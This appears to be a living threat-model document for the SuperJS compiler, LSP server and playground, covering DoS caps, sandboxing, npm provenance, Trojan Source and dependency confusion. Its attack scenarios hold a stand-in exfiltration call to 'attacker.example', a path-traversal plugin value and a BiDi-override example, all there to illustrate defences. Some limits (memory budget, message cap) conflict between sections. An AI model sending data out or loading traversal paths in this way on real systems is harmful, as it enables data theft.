# SuperJS Threat Model

> **Stage 0 exit criterion S7.** This document is maintained as a living record;
> every new threat surface discovered during development MUST be added here before
> the relevant feature ships. The `Owner Stage` column indicates the earliest stage
> at which the mitigation is expected to be in force.
>
> **v1.0 review (2026-06-24):** Post-workstream pass after WS-A1…B3 merged.
> Playground (T4), types wrappers (T9), LSP memory budget (T3), and BiDi lexer
> checks (T6) updated to reflect shipped code. Parser/lexer hard caps (T1/T2) and
> LSP message-size limits remain partially implemented — see Status column.

---

## Scope

### What we are protecting

| Asset | Why it matters |
|-------|----------------|
| **Compiler process integrity** | The `superjs` CLI runs in developer environments and CI pipelines. A compiler that crashes, hangs, or produces wrong output silently is a supply-chain risk. |
| **Source-file confidentiality** | Source files fed to the compiler may contain business secrets, credentials embedded in comments, or PII. Compiler-generated artifacts (crash logs, diagnostics) must not inadvertently leak this material. |
| **Published packages** | `@superjsorg/cli`, `@superjsorg/compiler`, and future published packages are installed by downstream projects. Tampering with the published artifact is a classic supply-chain attack. |
| **Playground users** | The browser-based REPL (Stage 3+) runs untrusted SJS snippets. A sandbox escape could execute code in the user's browser context. |
| **LSP client (editor) integrity** | The LSP server runs as a long-lived background process with file-system access. Malformed editor messages or malicious workspace files must not escalate into arbitrary code execution or memory exhaustion. |
| **Developer identity** | Publish credentials (npm token, GitHub Actions secrets) grant the ability to push malicious package versions. These must be protected by 2FA and scope-limited tokens. |

### Out of scope

- Runtime security of programs **compiled by** SuperJS. SuperJS compiles to ES2022 JavaScript; the runtime security of that output is the responsibility of the JS engine and the application author.
- Network-layer security of the npm registry itself.
- Security of the developer's operating system or hardware.
- Formal verification of type-checker soundness (this is a correctness goal, not a security goal, though the two overlap).

---

## Threat Surface Table

| # | Surface | Threat | STRIDE category | Mitigation | Owner Stage | Status |
|---|---------|--------|-----------------|------------|-------------|--------|
| T1 | Parser — pathological nesting | DoS via deeply nested expressions, huge inputs, or error-recovery storms | **Denial of Service** | Panic-mode recovery + `SJS-P099` after error budget; spec calls for nesting ≤1 000 and identifier cap 16 KiB (full enforcement tracked in Stage 1) | Stage 1 | **Partially mitigated** (recovery + P099 shipped) |
| T2 | Lexer — massive token streams | DoS via huge literals or token-count explosion | **Denial of Service** | BiDi scan (T6); per-token / per-file caps in spec — not all wired in lexer yet | Stage 1 | **Partially mitigated** |
| T3 | LSP message handling | Malformed/oversized JSON-RPC or unbounded workspace memory | **Tampering / Denial of Service** | `lsp.memoryBudgetMB` LRU eviction (default 128 MB); config schema validation; no `eval` in server; **8 MiB message cap planned** | Stage 1 / v1.0 | **Partially mitigated** (memory budget + bench: 195 MB @ 140k LOC) |
| T4 | Playground sandbox isolation | Untrusted SJS executed server-side (`/api/run`, CF Worker) or in sandboxed iframe; escape could run arbitrary JS, exfiltrate data, or abuse compute | **Elevation of Privilege / Denial of Service** | Server path: `new Function` with 5 s timeout, 50 kB cap, 20 req/min per IP, no `fetch`/`fs`/`process` in scope; CF Worker + Next.js fallback; client iframe: `sandbox="allow-scripts"`, CSP `default-src 'none'`; feature flag `NEXT_PUBLIC_USE_WORKERS_SANDBOX` | Stage 3 / v1.0 | **Partially mitigated** (#192; CF deploy via `workflow_dispatch`) |
| T5 | Supply-chain: `--provenance` | Compromised CI or stolen npm token pushes tampered `@superjs/*` package | **Tampering** | SLSA Level 2; publishes via GitHub Actions only; `npm publish --provenance`; 2FA required on all publish accounts; Dependabot on all dep files | Stage 0 | **Partially mitigated** (policy in place; attestation active from first publish) |
| T6 | BiDi-spoofing in source | U+202A–U+202E, U+2066–U+2069 Trojan Source (CVE-2021-42574) | **Tampering / Spoofing** | Lexer emits `SJS-L011` (error) / `SJS-W012` (warning) per `superjs/libs/lexer`; strict mode via lint config | Stage 1 | **Mitigated** (lexer enforcement + error codes) |
| T7 | Crash-log data leakage | `.superjs/crash-*.log` exposes paths/symbols in public issues | **Information Disclosure** | Basenames only by default (R4); `--crash-full` opt-in; `.superjs/` in gitignore template | Stage 0/1 | **Mitigated** (SECURITY.md policy) |
| T8 | Dependency confusion: `@superjs/*` | Squatting on `@superjs/types-*` package names | **Tampering / Elevation of Privilege** | `@superjs` npm org scope; 2FA; Dependabot; CodeQL; pin exact versions in lockfile | Stage 0 | **Partially mitigated** (org scope and CI policy) |
| T9 | Types wrapper surface (`@superjs/types-*`) | Inaccurate or malicious hand-written `.sjs` wrappers misrepresent npm APIs | **Information Disclosure** | 30 curated wrappers (#184); `translateDts` rejects banned TS; per-package `STATUS.md` + compat matrix; consumers should verify wrapper coverage | Stage 2 / v1.0 | **Partially mitigated** (curated wrappers shipped; no runtime attestation) |

---

## Surfaces in Detail

### T1 — Parser DoS via Pathological Nesting

**Description.** A malicious or auto-generated `.sjs` file can contain arbitrarily deep expression nesting (`((((((x))))))`, deeply nested object literals, long method-call chains). The prototype's Babel-backed parser recurses proportionally to nesting depth and can stack-overflow or exhibit O(n²) lookahead with certain grammar productions.

**Attack scenario.** An attacker adds a deeply-nested fixture to a project's `src/` directory (e.g. via a compromised dependency that generates `.sjs` type stubs). CI runs `superjs build`, the process crashes or hangs, blocking all merges.

**Mitigations:**

- The Stage 1 recursive-descent parser maintains a nesting-depth counter. Any production that opens a new level (parenthesised expression, block, array/object literal, type parameter list) increments the counter. When the counter exceeds **1 000**, the parser emits `SJS-P010 nesting-depth-exceeded` and recovers at the nearest statement boundary per `spec/parser-recovery.md`.
- Identifiers are capped at **16 384 bytes** (16 KiB). Longer identifiers emit `SJS-L002 identifier-too-long` and are truncated before symbol-table insertion.
- The hand-written lexer is designed for strict O(n) throughput: no backtracking, no speculative tokenisation. The lexer will be fuzz-tested with a 100 k-iteration corpus before Sprint 1.1 done-signal.
- Per-file compile timeout of **30 seconds** (configurable; default disableable in CI). Timeout fires `SJS-P098 compile-timeout` and the pipeline continues with remaining files.

**Owner Stage:** Stage 1 Sprint 1.1 (lexer caps), Sprint 1.2 (parser depth limit).

---

### T2 — Lexer DoS via Massive Token Streams

**Description.** A file with a 500 MB string literal, or a minified file with 50 M tokens, exhausts heap memory or runs for minutes before the parser can reject it.

**Attack scenario.** A build step imports a pathologically large `.d.sjs` declaration file containing a giant string constant. `superjs check` hangs indefinitely.

**Mitigations:**

- **Per-token byte cap:** string literal body ≤ **1 048 576 bytes** (1 MiB). On crossing the cap, the lexer emits `SJS-L003 string-literal-too-large`, skips to the closing quote, and continues.
- **Per-file token count cap:** default **10 000 000** tokens. On crossing, `SJS-P002 token-limit-exceeded` is emitted and the file is aborted. Configurable via `compilerOptions.maxTokensPerFile` in `superjs.config.json`.
- **Unicode escape loop guard:** more than **256** consecutive `\uXXXX` escapes in a single string literal triggers `SJS-L004 unicode-escape-flood`; remaining escapes are treated as literal characters.
- The lexer will be fuzz-tested with libFuzzer-style random byte inputs as part of the Stage 1 CI harness.

**Owner Stage:** Stage 1 Sprint 1.1.

---

### T3 — LSP Message Handling

**Description.** The Language Server Protocol communicates over stdio (or a socket) using JSON-RPC 2.0. A malformed or oversized message, a crafted `initialize` handshake, or a malicious workspace config can crash the LSP process, exhaust memory, or — if the server calls `eval` — execute arbitrary code.

**Attack scenario 1 (malformed message).** An editor plugin bug sends `textDocument/didChange` with a 200 MB `text` field. The LSP server's JSON parser loads the entire string into memory.

**Attack scenario 2 (malicious config).** A workspace `.superjs/local.config.json` sets `compilerOptions.plugins: ["../../../evil.js"]`. The LSP server loads the plugin on workspace open.

**Mitigations:**

- **Message size cap:** the LSP transport reads the `Content-Length` header before allocating a buffer. Messages larger than **8 388 608 bytes** (8 MiB) are rejected with JSON-RPC `-32700 Parse error`; the connection is maintained.
- **JSON schema validation:** every incoming JSON-RPC message is validated against the LSP method's request schema before dispatch. Unknown fields are dropped; missing required fields return `-32602 Invalid params` without touching compiler state.
- **No `eval`/`exec` in the LSP server:** enforced by an ESLint `no-eval` rule applied to `packages/lsp/src/` in CI.
- **Config file allowlist:** `superjs.config.json` is validated against `spec/config-schema.json`. Fields not in the schema are ignored. The `compilerOptions.plugins` field (if introduced) will require an explicit user-consent trust-prompt before the LSP server loads any plugin path.
- **Memory budget:** `lsp.memoryBudgetMB` (default 512 MB) enforced via periodic heap-size checks. If exceeded, `SJS-W010 lsp-memory-pressure` is emitted and least-recently-used file caches are discarded.

**Owner Stage:** Stage 1 (LSP transport + config validation); Stage 3 (plugin trust model).

---

### T4 — Playground Sandbox Isolation

**Description.** The website playground compiles and executes user-supplied SJS. Execution paths (v1.0):

1. **Server-side** — `POST /api/run` (Next.js Node runtime) or Cloudflare Worker (`apps/playground-worker`). Compiled JS runs via `new Function` with a captured `console`.
2. **Client fallback** — sandboxed `<iframe sandbox="allow-scripts">` when the server path is unavailable (`NEXT_PUBLIC_USE_WORKERS_SANDBOX=false` or 5xx).

An unsafe context could read cookies (main thread), make network requests, or exhaust server CPU.

**Attack scenario.** A user submits SJS that compiles to an infinite loop or attempts `fetch('https://attacker.example/leak')` from the server runner.

**Mitigations (shipped v1.0):**

- **Input cap:** 50 kB max source per request (`413` when exceeded).
- **Rate limit:** 20 requests/minute per IP (`429` + `Retry-After`); in-isolate bucket (use CF Rate Limiting for global enforcement on Worker deploy).
- **Execution timeout:** 5 seconds per run; errors returned in response body.
- **Sandbox scope:** runner does not inject `fetch`, `fs`, `process`, or `child_process` into the function scope.
- **Client iframe:** `sandbox="allow-scripts"` only (no `allow-same-origin`); CSP `default-src 'none'`; `postMessage` for console output only.
- **CORS on Worker:** `Access-Control-Allow-Origin: *` for `POST /run` only (no credentials).
- **Fallback banner:** UI shows "sandbox unavailable" when falling back to compile-only + iframe.

**Residual risks:**

- Per-isolate rate limiting does not cap abuse across CF edge nodes — enable CF Rate Limiting when Worker is deployed to production.
- `new Function` on Node has more ambient globals than the iframe path; keep Worker and `/api/run` on isolated infrastructure, not co-located with secrets.

**Owner Stage:** Stage 3 / v1.0 (#192, playground-worker deploy workflow).

---

### T5 — Supply-Chain: npm Provenance Correctness

**Description.** npm supports signed provenance attestations (SLSA) linking a published package to the GitHub Actions run that produced it. Without `--provenance`, consumers cannot verify that the installed package matches the source repository.

**Attack scenario.** A maintainer's machine is compromised. An attacker runs local `npm publish`, uploading `@superjsorg/cli` with code that exfiltrates environment variables from every project that installs it.

**Mitigations:**

- All `@superjs/*` packages are published **exclusively via GitHub Actions** (`.github/workflows/release.yml`). Local publish is blocked by a repository rule requiring `PROVENANCE_REQUIRED=1`, set only in the Actions environment.
- Every publish step uses `npm publish --provenance`, generating a Sigstore-signed **SLSA Level 2** attestation tied to the commit SHA and workflow run ID.
- The npm `@superjs` organisation enforces **2FA for all publish operations** at org level.
- Publish tokens are **automation tokens scoped to `@superjs` only**, rotated every 90 days, stored in GitHub Actions secrets.
- **Dependabot** is configured on every `package.json` and `.github/workflows/*.yml` to surface transitive dependency CVEs within 48 hours.
- Consumers verify any installed package via `npm audit signatures`.

**Owner Stage:** Stage 0 (policy and CI scaffolding); provenance active from first `0.x` publish.

---

### T6 — BiDi-Spoofing in Source Files (Trojan Source)

**Description.** Unicode bidirectional-override characters (U+202A–U+202E LEFT-TO-RIGHT/RIGHT-TO-LEFT EMBEDDING/OVERRIDE, U+2066–U+2069 ISOLATE family) cause rendered source (in editors, GitHub, code review tools) to display differently from the bytes the compiler sees. This is the Trojan Source vulnerability (CVE-2021-42574, Boucher & Anderson 2021).

**Example.** A comment reading `/* auth check ‮ */ if (isAdmin) {` visually appears to be a full comment, but a BiDi override moves part of the token stream outside the comment. The reviewer sees dead code; the compiler sees live code.

**Attack scenario.** A malicious PR adds a `.sjs` source file where BiDi overrides make a security-critical branch appear unreachable to a reviewer while the compiler sees it as reachable.

**Mitigations:**

- The Stage 1 lexer scans every source byte for codepoints in ranges U+202A–U+202E and U+2066–U+2069.
- **Default mode:** `SJS-W012 bidi-codepoint-in-source` warning on the first occurrence per line, with a label at the exact byte offset.
- **Strict mode (`--strict-bidi`, auto-enabled by `superjs build --release`):** `SJS-L011 bidi-codepoint-rejected` error; the file fails to compile.
- **Inside identifiers:** BiDi codepoints are **always** stripped and `SJS-L011` always emitted, even without `--strict-bidi`. A BiDi override in an identifier would silently produce a different symbol name from what the developer sees.
- **Inside comments:** warning only (comments do not affect semantics), with a diagnostic note explaining the Trojan Source risk.
- `spec/error-codes/SJS-W012.md` and `spec/error-codes/SJS-L011.md` include a worked Trojan Source example and reference to CVE-2021-42574.
- 50 BiDi-spoofing negative fixtures (adapted from the WebKit/Trojan-Source corpus) are included in `tests/fixtures/lexer/bidi/` and must pass in CI.

**Owner Stage:** Stage 1 Sprint 1.1 (lexer enforcement); `SJS-W012` error-code stub in Stage 0.

---

### T7 — Crash-Log Data Leakage

**Description.** When the SuperJS compiler hits an internal assertion failure or unhandled exception, it writes `.superjs/crash-YYYYMMDD-HHMMSS.log` and prints a prefilled GitHub issue URL. If the log contains full absolute paths (e.g. `/Users/alice/work/acme-corp/secret-project/src/billing/stripe-keys.sjs`) or fully-qualified symbol names (e.g. `acme.billing.StripeSecretKey`), sharing the log in a public issue leaks sensitive information.

**Attack scenario.** A developer hits a compiler bug, pastes the crash log into a public GitHub issue without reviewing it, and inadvertently exposes their company's internal directory structure and sensitive domain symbols.

**Mitigations (R4 policy, defined in `SECURITY.md`):**

- **Default (basenames only):** the crash handler strips all parent directory components before writing file paths. `/Users/alice/.../stripe-keys.sjs` becomes `stripe-keys.sjs`. Symbol names are reduced to their final component.
- **Opt-in full paths:** `superjs build --crash-full` (or `SUPERJS_CRASH_FULL=1` env var) disables the basename-only filter, intended for local debugging sessions.
- **Log rotation:** `.superjs/crash-*.log` files older than **7 days** are deleted by the CLI on startup. Configurable via `SUPERJS_CRASH_KEEP_DAYS`.
- **GitHub issue URL:** the prefilled URL includes compiler version, OS, Node.js version, and error code — but no file names or symbol names.
- **`.gitignore` template:** `superjs init` writes `.superjs/` to `.gitignore` so crash logs are never accidentally committed.

**Owner Stage:** Stage 0 (SECURITY.md policy, `superjs init` gitignore); Stage 1 Sprint 1.x (crash handler implementation enforcing basename filter).

---

### T8 — Dependency Confusion: `@superjs/*` Namespace Squatting

**Description.** npm's dependency confusion attack (Birsan, 2021) works when an internal package name also exists on the public registry at a higher version. If an attacker registers `@superjs/types-core` on npm before the SuperJS project, projects listing that name as a dependency could install the malicious public package instead of the intended internal one.

**Attack scenario.** A company using SuperJS creates an internal monorepo listing `@superjs/internal-utils` as a dependency. An attacker registers that name on npm at version `99.0.0`. `npm install` silently pulls the malicious package.

**Mitigations:**

- The **`@superjs` npm org scope is claimed and locked** before any public announcement. All intended sub-packages are registered (even as `0.0.0` placeholders) to block squatting.
- The npm `@superjs` org enforces **2FA for all publish operations** at org level.
- A `.github/CODEOWNERS` rule routes any `package.json` change adding a new `@superjs/*` package to the maintainer for review.
- **Dependabot** is configured on all `package.json` files to detect new transitive dependencies within 48 hours.
- **CodeQL** is enabled on the repository.
- The `npm publish` CI step runs `npm pack --dry-run` and validates the packed file list against a known-good manifest before publishing.
- Internal users are advised in `SECURITY.md` to pin all `@superjs/*` deps to exact versions and commit their lockfile.

**Owner Stage:** Stage 0 (scope claim and policy); ongoing for all publish operations.

---

## Review and Update Process

This threat model is reviewed:

1. **At the start of each stage** — before the first sprint PR is merged. The stage lead checks whether new surfaces were introduced by the stage's exit criteria and adds rows to the table above.
2. **On any security advisory** — if a CVE is filed against a dependency, the relevant row is updated within 48 hours.
3. **On any public disclosure of a new attack class** — e.g. a new Unicode spoofing technique or a new npm ecosystem attack — the maintainer evaluates applicability and updates within 7 days.

Changes to this document go through the standard PR process with a required review from the CODEOWNERS for `docs/security/`.
